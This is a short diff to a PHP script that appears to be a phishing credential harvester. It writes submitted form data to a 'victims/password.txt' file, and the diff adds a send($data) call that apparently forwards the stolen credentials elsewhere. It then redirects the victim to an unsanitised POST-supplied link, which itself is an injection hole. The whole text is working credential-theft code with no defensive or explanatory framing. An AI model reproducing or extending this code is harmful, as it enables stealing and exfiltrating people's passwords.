@@ -19,6 +19,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST')
     $data .= "\n-----------------------------------------------------\n";                                     //Append newline
     
     File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                       //Append data to file
+    send($data);	
 }
 echo "<script>window.location.replace('".$_POST['link']."');</script>";
 ?>
